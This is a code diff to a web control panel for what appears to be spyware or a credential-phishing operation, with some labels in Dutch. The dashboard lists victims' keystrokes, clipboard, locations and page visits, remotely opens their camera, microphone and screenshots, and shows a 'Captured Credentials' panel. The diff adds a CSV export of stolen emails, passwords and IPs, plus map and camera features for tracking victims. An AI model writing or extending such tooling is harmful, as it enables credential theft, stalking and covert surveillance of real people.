@@ -300,6 +300,49 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 @keyframes spin{to{transform:rotate(360deg)}}
 #refresh-ring{width:14px;height:14px;border-radius:50%;border:2px solid var(--border2);border-top-color:var(--accent);display:inline-block;vertical-align:middle;margin-left:6px;animation:spin .8s linear infinite;opacity:0;transition:opacity .3s}
 #refresh-ring.active{opacity:1}
+
+/* ═══ DARK MODE ═══ */
+body[data-dark]{--bg:#141518;--panel:#1e1f23;--panel2:#25262b;--border:#33353d;--border2:#454852;--text:#d1d5db;--text2:#9aa0ab;--dim:#626974;--green:#34d058;--online:#34d058;--danger:#f45157;--accent:#4f97f8;--accent2:#3a82f0;--radius:8px}
+body[data-dark] .ev .tp.location{background:#0a2218;color:#34d058;border-color:#1c4d33}
+body[data-dark] .ev .tp.media{background:#13162a;color:#7986cb;border-color:#2a3595}
+body[data-dark] .ev .tp.photo{background:#0d1e35;color:#4f97f8;border-color:#1a4080}
+body[data-dark] .ev .tp.error{background:#2d1318;color:#f45157;border-color:#6b1a1d}
+body[data-dark] .ev .tp.client_connected{background:#0a2218;color:#34d058;border-color:#1c4d33}
+body[data-dark] .ev .tp.client_disconnected{background:#2d1318;color:#f45157;border-color:#6b1a1d}
+body[data-dark] .ev .tp.keystrokes{background:#221800;color:#ffb300;border-color:#4a3500}
+body[data-dark] .ev .tp.clipboard{background:#1a0e22;color:#ba68c8;border-color:#4a1a60}
+body[data-dark] .ev .tp.page_visit{background:#0d1e35;color:#4f97f8;border-color:#1a4080}
+body[data-dark] .ev .tp.command,body[data-dark] .ev .tp.device_info{background:#1f2128;color:#8c95a6;border-color:#33353d}
+body[data-dark] .key-entry .key-text,body[data-dark] .clip-entry .clip-text{background:#141518;border-color:#33353d;color:#d1d5db}
+body[data-dark] .di-item{background:#25262b;border-color:#33353d}
+body[data-dark] .pcard,body[data-dark] .vcard{background:#25262b;border-color:#33353d}
+body[data-dark] .cam-card{background:#1e1f23;border-color:#33353d}
+body[data-dark] .cam-card .cam-hdr,body[data-dark] .cam-card .cam-controls{background:#25262b;border-color:#33353d}
+body[data-dark] .cfg-group{background:#1e1f23;border-color:#33353d}
+body[data-dark] .pnl{background:#1e1f23;border-color:#33353d}
+body[data-dark] .pnl-h{background:#25262b;border-color:#33353d}
+body[data-dark] input:not([type=checkbox]):not([type=radio]):not([type=range]),body[data-dark] select,body[data-dark] textarea{background:#25262b;border-color:#454852;color:#d1d5db}
+body[data-dark] input::placeholder,body[data-dark] textarea::placeholder{color:#626974}
+body[data-dark] .toast{background:#1e1f23;border-color:#33353d;color:#d1d5db}
+body[data-dark] .search-results{background:#1e1f23;border-color:#33353d}
+body[data-dark] .search-results .sr-group-title{background:#25262b}
+body[data-dark] .search-wrap{background:#25262b;border-color:#454852}
+body[data-dark] .search-wrap input{color:#d1d5db}
+body[data-dark] .tab:hover{background:rgba(255,255,255,.05)}
+body[data-dark] .tab.active{background:rgba(79,151,248,.08)}
+body[data-dark] .stat:hover{background:#25262b}
+body[data-dark] .tgl span{background:#454852}
+body[data-dark] .storage-bar{background:#33353d}
+body[data-dark] .cl-action-btn{background:#25262b;border-color:#33353d;color:#9aa0ab}
+body[data-dark] .cl-action-btn:hover{border-color:#4f97f8;color:#4f97f8}
+body[data-dark] .sr-item:hover{background:#25262b}
+body[data-dark] ::-webkit-scrollbar-track{background:#1e1f23}
+body[data-dark] ::-webkit-scrollbar-thumb{background:#454852}
+body[data-dark] .hdr{background:var(--panel);border-color:var(--border)}
+body[data-dark] .toolbar{background:var(--panel);border-color:var(--border)}
+body[data-dark] .stats{background:var(--border)}
+body[data-dark] .stat{background:var(--panel)}
+body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
 </style>
 </head>
 <body>
@@ -315,6 +358,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
     <button class="btn export" onclick="location.href='/api/export?token='+AUTH_TOKEN">Export JSON</button>
     <span id="refresh-ring" title="Refreshing..."></span><span style="font-size:.55rem;color:var(--dim);cursor:default;user-select:none" title="Ctrl+K:search  1-9:tabs  R:refresh  Esc:close">[shortcuts]</span>
     <button class="btn" onclick="refreshAll()">↻ Refresh</button>
+    <button id="theme-btn" class="btn" onclick="toggleTheme()" title="Toggle dark/light mode">🌙</button>
     <button class="btn danger" onclick="if(confirm('Delete ALL data?'))clearAll()">Clear All</button>
     <button class="btn" onclick="doLogout()" title="Logout" style="border-color:#a00">🔒 Logout</button>
 </div>
@@ -451,7 +495,10 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
     <div class="pnl">
         <div class="pnl-h">
             <h2>🔑 Captured Credentials</h2>
-            <button class="btn danger" onclick="if(confirm('Delete all credentials?'))clearCredentials()">Clear</button>
+            <div style="display:flex;gap:6px">
+                <button class="btn export" onclick="downloadCredentialsCSV()" title="Download als CSV bestand">⬇ CSV</button>
+                <button class="btn danger" onclick="if(confirm('Delete all credentials?'))clearCredentials()">Clear</button>
+            </div>
         </div>
         <div class="pnl-b np" id="cred-log"><div class="empty">No credentials captured yet</div></div>
     </div>
@@ -649,6 +696,9 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="https://cdn.socket.io/4.8.3/socket.io.min.js" onerror="window._sioFailed=true"></script>
 <script>
+// Prevent flash of wrong theme — sync init before DOM paint
+try { if (localStorage.getItem('cc-dark') === '1') document.body.setAttribute('data-dark', ''); } catch {}
+
 // ═══════════════════════════════════════════════════════════════
 //  STATE
 // ═══════════════════════════════════════════════════════════════
@@ -1272,6 +1322,7 @@ async function loadCameraFeeds() {
         return bo - ao;
     });
     if (currentFilter) clientIds = clientIds.filter(id => id === currentFilter);
+    if (camOnlineOnly) clientIds = clientIds.filter(id => stats.clients[id] && stats.clients[id].online);
 
     if (!clientIds.length) { c.innerHTML = '<div class="empty">No clients connected</div>'; return; }
 
@@ -1310,6 +1361,7 @@ async function loadCameraFeeds() {
                     <button id="mic-btn-${id}" onclick="toggleAudio('${id}')" ${!online?'disabled':''}${audioPlayers[id]?' class="active"':''}>🎙 Mic</button>
                     <button onclick="requestScreenshot('${id}')" ${!online?'disabled':''} title="Verzoek direct schermafbeelding">📷 Screenshot</button>
                     <button onclick="requestLocation('${id}')" ${!online?'disabled':''} title="Verzoek huidige locatie">📍 Locatie</button>
+                    <button onclick="(function(){var i=document.getElementById('cam-img-${id}');if(i&&i.src&&i.style.display!=\'none\')openLightbox(i.src);else toast(\'Nog geen beeld\');})()" title="Beeld vollescherm">⛶ FS</button>
                     <button onclick="if(confirm('Client ${id} verwijderen?'))deleteClient('${id}')" title="Verwijder client" style="border-color:#f5c6c4;color:#d93025">🗑</button>
                 </div>
             </div>`;
@@ -1590,6 +1642,7 @@ function renderClients(clients) {
                     <button class="cl-action-btn" onclick="event.stopPropagation();openNotes('${id}')">Notes${notesCnt ? '(' + notesCnt + ')' : ''}</button>
                     <button class="cl-action-btn" onclick="event.stopPropagation();openTagModal('${id}')">Label</button>
                     <button class="cl-action-btn" onclick="event.stopPropagation();exportClient('${id}')">Export</button>
+                    <button class="cl-action-btn" onclick="event.stopPropagation();showClientOnMap('${id}')" title="Toon op kaart">📍 Map</button>
                     ${isPinned
                         ? `<button class="cl-action-btn" onclick="event.stopPropagation();unPinClient('${id}')" style="border-color:#553333;color:#aa5555">Unpin</button>`
                         : `<button class="cl-action-btn" onclick="event.stopPropagation();quickPin('${id}')">Pin</button>`}
@@ -1703,8 +1756,8 @@ async function loadMap() {
     const byClient = {};
     locs.forEach(l => { if (!byClient[l.clientId]) byClient[l.clientId] = l; });
 
-    // Colors per client
-    const colors = ['#ffffff','#aaaaaa','#888888','#666666','#bbbbbb','#999999','#cccccc','#777777'];
+    // Colors per client (vivid, distinguishable on light & dark map tiles)
+    const colors = ['#e53935','#1e88e5','#43a047','#fb8c00','#8e24aa','#00acc1','#f06292','#7cb342','#ff7043','#26c6da'];
     let ci = 0;
 
     Object.entries(byClient).forEach(([id, l]) => {
@@ -1740,7 +1793,7 @@ async function loadMap() {
 //  DELETE CLIENT
 // ═══════════════════════════════════════════════════════════════
 async function deleteClient(id) {
-    await fetch(`/api/client/${id}`, { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
+    try { await apiFetch(`/api/client/${id}`, { method: 'DELETE' }); } catch(e) { showError('deleteClient', e); }
     refreshAll();
 }
 
@@ -1764,8 +1817,9 @@ function showToast(ev) {
     const toast2 = document.createElement('div');
     toast2.className = `toast ${cls}`;
     toast2.textContent = `${evType}: ${fmtEvent(ev.data).slice(0, 50)}`;
+    while (area.children.length >= 5) area.removeChild(area.firstChild);
     area.appendChild(toast2);
-    setTimeout(() => toast2.remove(), 4000);
+    setTimeout(() => { try { toast2.remove(); } catch {} }, 4000);
     // Play notification sound for important events
     if (['client_connected', 'client_disconnected', 'photo', 'media', 'error'].includes(ev.type)) {
         playAdminNotifSound(ev.type);
@@ -2048,7 +2102,8 @@ function updateCmdTargets() {
 function toast(msg) {
     const area = $('#toasts'), t = document.createElement('div');
     t.className = 'toast command'; t.textContent = msg;
-    area.appendChild(t); setTimeout(() => t.remove(), 4000);
+    while (area.children.length >= 5) area.removeChild(area.firstChild);
+    area.appendChild(t); setTimeout(() => { try { t.remove(); } catch {} }, 4000);
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -2167,6 +2222,55 @@ document.addEventListener('click', e => {
         closeSearch();
     }
 });
+
+// ═══════════════════════════════════════════════════════════════
+//  DARK MODE
+// ═══════════════════════════════════════════════════════════════
+function toggleTheme() {
+    const dark = !document.body.hasAttribute('data-dark');
+    dark ? document.body.setAttribute('data-dark', '') : document.body.removeAttribute('data-dark');
+    try { localStorage.setItem('cc-dark', dark ? '1' : '0'); } catch {}
+    const btn = $('#theme-btn');
+    if (btn) btn.textContent = dark ? '☀️' : '🌙';
+}
+// Sync button label to current state after DOM is ready
+(function () {
+    try {
+        if (document.body.hasAttribute('data-dark')) {
+            const b = $('#theme-btn'); if (b) b.textContent = '☀️';
+        }
+    } catch {}
+})();
+
+// ═══════════════════════════════════════════════════════════════
+//  EXPORT / DOWNLOAD HELPERS
+// ═══════════════════════════════════════════════════════════════
+async function downloadCredentialsCSV() {
+    const creds = await api('/api/credentials?limit=9999');
+    if (!creds || !creds.length) { toast('⚠️ Geen credentials om te downloaden'); return; }
+    const rows = [['#', 'Time', 'Email/Username', 'Password', 'Source', 'IP']];
+    creds.forEach((cr, i) => rows.push([i + 1, cr.timestamp || '', cr.email || '', cr.password || '', cr.source || '', cr.ip || '']));
+    const csv = rows.map(r => r.map(v => '"' + String(v).replace(/"/g, '""') + '"').join(',')).join('\n');
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
+    a.download = 'credentials_' + Date.now() + '.csv';
+    a.click();
+    setTimeout(() => URL.revokeObjectURL(a.href), 5000);
+    toast('⬇️ ' + creds.length + ' credentials gedownload als CSV');
+}
+
+function showClientOnMap(clientId) {
+    // Switch to map tab
+    const mapTab = document.querySelector('.tab[data-v="map"]');
+    if (mapTab) mapTab.click();
+    // After map loads, zoom to the client
+    setTimeout(() => {
+        if (!map) return;
+        const m = markers[clientId];
+        if (m) { map.setView(m.getLatLng(), 15); m.openPopup(); }
+        else toast('Geen locatie beschikbaar voor ' + clientId);
+    }, 600);
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  AUTO-REFRESH
